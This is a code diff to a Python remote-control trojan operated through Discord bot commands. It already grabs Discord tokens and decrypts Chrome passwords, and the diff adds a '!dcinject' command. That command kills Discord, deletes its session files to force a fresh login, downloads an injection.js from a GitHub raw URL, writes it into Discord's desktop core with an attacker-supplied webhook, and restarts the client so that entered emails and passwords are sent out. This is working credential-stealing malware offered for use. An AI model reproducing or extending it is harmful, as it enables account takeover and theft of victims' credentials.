@@ -37,7 +37,7 @@ import sys
 import psutil
 import tkinter as tk
 from tkinter import simpledialog
-
+import glob
 
 
 startup = winshell.startup()
@@ -64,6 +64,8 @@ intents: Intents = Intents.default()
 intents.message_content = True
 client: Client = Client(intents=intents)
 
+
+DETACHED_PROCESS = 0x00000008
 
 
 def showReqPass():
@@ -219,6 +221,7 @@ def get_response(user_input: str) -> str:
 !message -> display a message box / !message [text]
 !voice -> text to speech / !voice [text message]
 !dcinfo -> grab discord info (email, phone, 2fa/mfa info, nitro info, token)
+!dcinject -> inject script into discord and get email and password if changed or logged in / !dcinject webhookUrl
 ```"""
 #shutdown -r -t 0
     elif "!cd" in text:
@@ -329,9 +332,13 @@ def get_response(user_input: str) -> str:
         return f"```file should be in startup!```"
 
     elif "!dcinfo" in text.lower():
+        kill_discord()
 
         dcInfo = get_token()
+        start_discord()
         return dcInfo
+    
+        
 
 async def send_message(message: Message, user_message: str, file_path: str = None) -> None:
     if not user_message and not file_path:
@@ -442,7 +449,72 @@ def password_decryption(password, encryption_key):
             return "No Passwords"
   
 
+local_app_data_path = os.environ['LOCALAPPDATA']
 
+def inject_into_discord(webhook_url):
+
+    discord_session_path = os.path.join(os.environ['APPDATA'], 'Discord')
+
+    for file in os.listdir(discord_session_path):
+        file_path = os.path.join(discord_session_path, file)
+        try:
+            if os.path.isfile(file_path):
+                os.unlink(file_path)
+        except Exception as e:
+            print(f"Fehler beim Löschen der Datei {file_path}: {e}")
+
+    print("Sitzungsdaten wurden gelöscht. Sie müssen sich erneut bei Discord anmelden.")
+
+    path = fr'{local_app_data_path}\Discord\*\modules\discord_desktop_core-*\discord_desktop_core'
+
+    matching_folders = glob.glob(path)
+
+    url = 'https://raw.githubusercontent.com/Paloox/discordInjectionFile/main/injection.js'
+
+    response = requests.get(url)
+
+
+    file_content = response.text
+
+    if matching_folders:
+
+        target_folder = matching_folders[0]
+
+        new_file_path = os.path.join(target_folder, 'index.js')
+
+        with open(new_file_path, 'w') as file:
+
+            file.write(file_content)
+
+
+
+        search_text = "%WEBHOOK_URL_INJECT%"
+
+        replace_text = webhook_url
+
+        with open(new_file_path, 'r') as file:
+
+            data = file.read()
+
+            data = data.replace(search_text, replace_text)
+
+
+
+        with open(new_file_path, 'w') as file:
+
+            file.write(data)
+
+        
+
+
+def start_discord():
+
+    subprocess.Popen(fr"{local_app_data_path}\Discord\Update.exe --processStart Discord.exe", shell=True)
+
+
+def kill_discord():
+
+    subprocess.Popen("taskkill /F /IM Discord.exe", shell=True)
 
     
 
@@ -664,6 +736,24 @@ async def on_message(message: Message) -> None:
             message = "No passwords saved in Chrome"
             await send_message(message, user_message)
             pass
+
+
+    if "!dcinject" in user_message.lower():
+        string = user_message
+        say = "!dcinject "
+        if say in string:
+            saysplit = string.split(say,1)
+            webhook = saysplit[1]
+
+            kill_discord()
+            inject_into_discord(webhook)
+            start_discord()
+
+            message = "Injected!"
+            await send_message(message, user_message)
+
+
+
 
 
 
